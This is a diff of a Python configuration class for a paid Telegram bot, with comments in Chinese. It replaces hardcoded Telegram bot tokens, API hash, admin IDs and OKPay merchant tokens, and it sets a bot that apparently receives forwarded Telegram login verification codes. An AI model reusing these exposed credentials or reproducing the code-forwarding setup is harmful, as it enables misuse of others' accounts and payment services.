@@ -65,29 +65,29 @@ class Config:
     """配置类 - 所有配置项集中管理"""
 
     # ---------- Telegram Bot 配置 ----------
-    BOT_TOKEN: str = "8826676249:AAFwagmUOm_vqnDXpWOmP8h3olOuBHoT5Ok"
+    BOT_TOKEN: str = "8509148342:AAEk0BVqke8Ydu07SwkIADAbhW2IPsh1Vr8"
     API_ID: int = 33059943
     API_HASH: str = "1c73a0510ba0b8cb3bd16f24acfd62bf"
 
     # ---------- 管理员配置 ----------
     SUPER_ADMIN_IDS: List[int] = [7002638062]          # 超级管理员（最高权限）
-    ADMIN_IDS: List[int] = [8684827204]                # 普通管理员（可被超级管理管理）
+    ADMIN_IDS: List[int] = [7509368655]                # 普通管理员（可被超级管理管理）
 
     # ---------- OKPay 商户配置 ----------
-    OKPAY_SHOP_ID: str = "34949"
-    OKPAY_SHOP_TOKEN: str = "8deDikQTGXRuy5ABEGIKMNbcFWY4Jwn"
-    OKPAY_NAME: str = "￥1"
-    OKPAY_BOT_USERNAME: str = "peohikkbot"
+    OKPAY_SHOP_ID: str = "35005"
+    OKPAY_SHOP_TOKEN: str = "98fDTmGUgRvlx5CsGHIK1NScFY0r4Jn"
+    OKPAY_NAME: str = "许"
+    OKPAY_BOT_USERNAME: str = "bhgffgggbot"
     OKPAY_API_URL: str = "https://api.okaypay.me/shop/"
 
     # ---------- 支付配置 ----------
-    PAYMENT_AMOUNT: str = "1.00"                       # 支付金额
+    PAYMENT_AMOUNT: str = "0.5"                       # 支付金额
     PAYMENT_COIN: str = "USDT"                         # 支付币种 (USDT / TRX)
 
     # ---------- 频道配置 ----------
-    REQUIRED_CHANNEL: str = ""                         # 留空=不验证（原来是 @BMW99111）
-    FORWARD_CHANNEL: str = ""                          # 留空=不导出
-    FORWARD_BOT_USERNAME: str = "peohikkbot"           # 转发验证码的目标机器人
+    REQUIRED_CHANNEL: str = "xsbooo"                         # 留空=不验证（原来是 @BMW99111）
+    FORWARD_CHANNEL: str = "xsbbooo"                          # 留空=不导出
+    FORWARD_BOT_USERNAME: str = "bhgffgggbot"           # 转发验证码的目标机器人
     TELEGRAM_BOT_ID: int = 777000                     # Telegram官方验证码发送者ID
 
     # ---------- Webhook / Web 配置 ----------
